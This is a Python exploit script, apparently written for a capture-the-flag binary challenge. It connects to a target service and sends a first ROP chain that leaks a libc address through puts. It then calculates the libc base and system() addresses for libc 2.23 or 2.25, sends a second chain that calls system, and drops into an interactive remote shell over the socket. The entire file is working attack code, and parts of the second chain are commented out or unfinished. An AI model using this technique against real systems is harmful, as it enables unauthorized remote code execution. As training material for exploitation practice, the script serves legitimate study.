#!/usr/bin/env python

import struct
from time import sleep
import sys
from subprocess import *
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import signal
import socket

hostname = sys.argv[1]
port = int(sys.argv[2])
libc = sys.argv[3]


#Pre-calculated positions based on debugging binary
#libc base 0x00007ffff7a3c000
#libc stdin 0x00007ffff7dd38c0
#libc.so.6 execve offset 0x3f384
libc_stdin_distance  = 0x3978c0
libc_poprdx_distance = 0x1b92

#libc 2.23
#libc_system_distance = 0x3f480 #0x45390
# libc_execve_distance = 0xb8630
# offset_filename 	 = 0x85c2667
# puts_func_ptr		 = 0x601028
stdout_struct		 = 0x601050
stdin_struct 		 = 0x601060
__libc_start_ptr     = 0x601020
#	#most likely libc-2.23
puts 				 = 0x40063a
def enable_sigpipe():

    signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
    for sig in signals:
        if hasattr(signal, sig):
            signal.signal(getattr(signal, sig), signal.SIG_DFL)

def str_to_lendian(shellcode_str):
	shellcode_str = shellcode_str[::-1]
	shellcode_str = shellcode_str.encode('hex')
	shellcode_str = int(shellcode_str,16)
	return shellcode_str

def build_bytes(rop_obj):
	if type(rop_obj) is list:

		shellcode_list = [ struct.pack('<Q', i) for i in rop_obj]
		return ''.join(shellcode_list)

	elif type(rop_obj) is str:
		#shellcode_str = str_to_lendian(rop_obj)
		return str_to_lendian(rop_obj)

def read_netbytes(socket_obj, outputtype, bytecount=0):	
	sleep(.5)
	response_list = []
	output = socket_obj.recv(bytecount)
	response_list = ([hex(ord(i)) for i in output])[::-1]

	if outputtype == "memaddr":
		return int(''.join(['%02s'%i[2:] for i in response_list]), 16)

	if outputtype == "bytes":
		return [i for i in response_list if i != '0xa']

def shell():
	while True:
		sleep(.5)
		output = s.recv(2048)
		print output
		shell_command = raw_input("# ")
		s.sendall(shell_command+"\n")	
		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
			s.close()
			break
		sleep(.5)



roplist1 = []
roplist1.append(0x4141414141414141) #<--- rid ptr on first loop
roplist1.append(0x4242424242424242) #junk
roplist1.append(0x4343434343434343) #junk
roplist1.append(0x4444444444444444) #junk
roplist1.append(0x4545454545454545) #junk
roplist1.append(0x4646464646464646) #junk
roplist1.append(0x4747474747474747) #junk
roplist1.append(0x4848484848484848) #junk
roplist1.append(0x00000000006012a0) # ret <--- rbp on first loop / pushed as rtn ptr
roplist1.append(0x0000000000400627) # loop back to start 
roplist1.append(0x0000000000601068) # fgets overwrite
roplist1.append(0x00000000004006d3) # pop rdi
roplist1.append(__libc_start_ptr  ) #
roplist1.append(0x000000000040063a) #puts
roplist1.append(0x0000000000400631) #loop back to start 


ropchain1 = build_bytes(roplist1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((hostname, port))

data = s.recv(1024)
sleep(2)
banner = "ROP me outside, how 'about dah?\n"

if data == banner:
	print "[+] Received banner."
	#raw_input("[+] Press enter to continue. ")

print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(ropchain1)
raw_input("[+] Press enter to continue: ")
s.sendall(ropchain1+"\n")

data = s.recv(1024)
if data == banner:

	print "[+] Succesfully sent that shit back into a loop."

s.sendall("\n")

if libc == "2.25":
	libc_system_distance = 0x3f480
	__libc_start_dist	 = 0x201f0 
	
if libc == "2.23":
	libc_system_distance = 0x45390
	__libc_start_dist	 = 0x20740 

print "[*] Reading address leak..."

__libc_start_main = read_netbytes(s, "memaddr", 6)

print "[+] Memory leak for libc_start_main at %s." % hex(__libc_start_main)
print "[*] Doin' math 'n' shit..."

libc_base = __libc_start_main - __libc_start_dist
print "\t[+] Libc base at addr: %s" % hex(libc_base)

system = libc_base + libc_system_distance
print "\t[+] System syscall gadget at addr: %s" % hex(system)


if libc == "2.25":
	poprdx = libc_base + 0x1b92
	poprcx = libc_base + 0x1800fc
	execve = libc_base + 0xb8630

if libc == "2.23":
	poprdx = libc_base + 0x000f4c06
	poprcx = libc_base + 0xdcb32
	execve = libc_base + 0x4526a #?

#Start build of second stage ROP shellcode
print "[*] Building ze stage 2 ROP gadgets..."
sleep(.5)

binsh = build_bytes("//bin/sh")
binsh_ptr = 0x601260 

roplist2 = []
roplist2.append(system) 






ropchain2 = build_bytes(roplist2)

raw_input("[+] Press enter to send second stage.")
print "[+] Sending second stage."
s.sendall(ropchain2+"\n")
# raw_input('[+] Press enter to continue.')
# sleep(.5)

# #raw_input("[+] Press enter to continue: ")
# puts_addr = read_netbytes(s, "bytes", 10)
# print "[+] Puts function at address: %s" % str(puts_addr)
# print "[+] String of base: %s" % str([chr(int(i,16)) for i in puts_addr])

shell()





# roplist2.append(binsh) 				# <---- 0x600fd3 
# roplist2.append(0x0000000000000000) #
# # roplist2.append(0x4141414141414141) #
# # roplist2.append(0x4141414141414141) #
# # roplist2.append(0x4141414141414141) #
# # roplist2.append(0x4141414141414141) #
# # roplist2.append(0x4141414141414141) #
# # roplist2.append(0x4141414141414141) #
# roplist2.append(0x00000000006012a0) #
# roplist2.append(0x00000000004006d3) # pop rdi; ret <---- rbp on heap
# roplist2.append(binsh_ptr)  			# /bin/sh @ 0x601160
# roplist2.append(system) 			# needs to be 0x601028
# roplist2.append(0x0000000000000000)
